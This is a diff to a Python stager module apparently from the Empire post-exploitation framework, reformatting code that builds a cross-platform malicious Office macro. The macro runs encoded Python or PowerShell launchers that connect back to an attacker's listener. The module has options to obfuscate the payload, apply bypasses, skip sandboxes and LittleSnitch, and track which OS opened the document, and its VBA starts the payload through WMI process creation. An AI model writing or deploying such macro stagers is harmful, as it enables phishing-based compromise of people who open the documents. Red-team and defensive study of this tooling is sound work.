@@ -5,6 +5,7 @@ from builtins import object
 from empire.server.common import helpers
 import re
 
+
 class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
@@ -14,7 +15,7 @@ class Stager(object):
 
             'Author': ['@enigma0x3', '@harmj0y', '@DisK0nn3cT', '@malcomvetter'],
 
-            'Description': ('Generates a Win/Mac cross platform MS Office macro for Empire, compatible with Office 97-2016 including Mac 2011 and 2016 (sandboxed).'),
+            'Description': 'Generates a Win/Mac cross platform MS Office macro for Empire, compatible with Office 97-2016 including Mac 2011 and 2016 (sandboxed).',
 
             'Comments': [
                 'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/',
@@ -26,53 +27,55 @@ class Stager(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to generate stager for.',
+                'Required': True,
+                'Value': ''
             },
             # Don't think the language matters except the framework requires it:
-            'Language' : {
-                'Description'   :   'Language of the stager to generate.',
-                'Required'      :   True,
-                'Value'         :   'powershell'
+            'Language': {
+                'Description': 'Language of the stager to generate.',
+                'Required': True,
+                'Value': 'powershell',
+                'SuggestedValues': ['powershell', 'python'],
+                'Strict': True
             },
-            'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting.',
-                'Required'      :   False,
-                'Value'         :   '0'
+            'StagerRetries': {
+                'Description': 'Times for the stager to retry connecting.',
+                'Required': False,
+                'Value': '0'
             },
             'OutFile': {
                 'Description': 'Filename that should be used for the generated output.',
                 'Required': False,
                 'Value': ''
             },
-            'SafeChecks' : {
-                'Description'    :  'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
-                'Required'       :  True,
-                'Value'          :  'True',
-                'SuggestedValues':  ['True', 'False'],
-                'Strict'         :  True
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True',
+                'SuggestedValues': ['True', 'False'],
+                'Strict': True
             },
-            'PixelTrackURL' : {
-                'Description'   :   'URL to add in pixel tracking which OS attempted macro opening, useful for shell debugging and confirmation.',
-                'Required'      :   False,
-                'Value'         :   'http://127.0.0.1/tracking?source='
+            'PixelTrackURL': {
+                'Description': 'URL to add in pixel tracking which OS attempted macro opening, useful for shell debugging and confirmation.',
+                'Required': False,
+                'Value': 'http://127.0.0.1/tracking?source='
             },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'Proxy': {
+                'Description': 'Proxy to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'ProxyCreds': {
+                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
             'Obfuscate': {
                 'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
@@ -103,7 +106,6 @@ class Stager(object):
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self):
         def formStr(varstr, instr):
             holder = []
@@ -111,31 +113,32 @@ class Stager(object):
             str2 = ''
             str1 = varstr + ' = "' + instr[:54] + '"'
             for i in range(54, len(instr), 48):
-                holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
+                holder.append('\t\t' + varstr + ' = ' + varstr + ' + "' + instr[i:i + 48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
-            str1 = str1 + "\r\n"+str2
+            str1 = str1 + "\r\n" + str2
             return str1
 
         # extract all of our options
         language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
+        listener_name = self.options['Listener']['Value']
         obfuscate = self.options['Obfuscate']['Value']
-        obfuscateCommand = self.options['ObfuscateCommand']['Value']
-        userAgent = self.options['UserAgent']['Value']
+        obfuscate_command = self.options['ObfuscateCommand']['Value']
+        user_agent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
-        safeChecks = self.options['SafeChecks']['Value']
-        pixelTrackURL = self.options['PixelTrackURL']['Value']
+        proxy_creds = self.options['ProxyCreds']['Value']
+        stager_retries = self.options['StagerRetries']['Value']
+        safe_checks = self.options['SafeChecks']['Value']
+        pixel_track_url = self.options['PixelTrackURL']['Value']
         bypasses = self.options['Bypasses']['Value']
 
-        invokeObfuscation = False
+        invoke_obfuscation = False
         if obfuscate.lower() == "true":
-            invokeObfuscation = True
+            invoke_obfuscation = True
 
         # generate the python launcher code
-        pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        pylauncher = self.mainMenu.stagers.generate_launcher(listener_name, language="python", encode=True,
+                                                             userAgent=user_agent, safeChecks=safe_checks)
 
         if pylauncher == "":
             print(helpers.color("[!] Error in python launcher command generation."))
@@ -147,10 +150,12 @@ class Stager(object):
             pypayload = formStr("str", match)
 
         # generate the powershell launcher code
-        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True,
-                                                               obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand,
-                                                               userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,
-                                                               stagerRetries=stagerRetries, safeChecks=safeChecks,
+        poshlauncher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=True,
+                                                               obfuscate=invoke_obfuscation,
+                                                               obfuscationCommand=obfuscate_command,
+                                                               userAgent=user_agent, proxy=proxy,
+                                                               proxyCreds=proxy_creds,
+                                                               stagerRetries=stager_retries, safeChecks=safe_checks,
                                                                bypasses=bypasses)
 
         if poshlauncher == "":
@@ -220,6 +225,6 @@ Public Function Debugging() As Variant
                 Set objProcess = GetObject("winmgmts:\\\\.\\root\cimv2:Win32_Process")
                 objProcess.Create str, Null, objConfig, intProcessID
             #End If
-End Function""" % (pixelTrackURL, pypayload, poshpayload)
+End Function""" % (pixel_track_url, pypayload, poshpayload)
 
         return macro
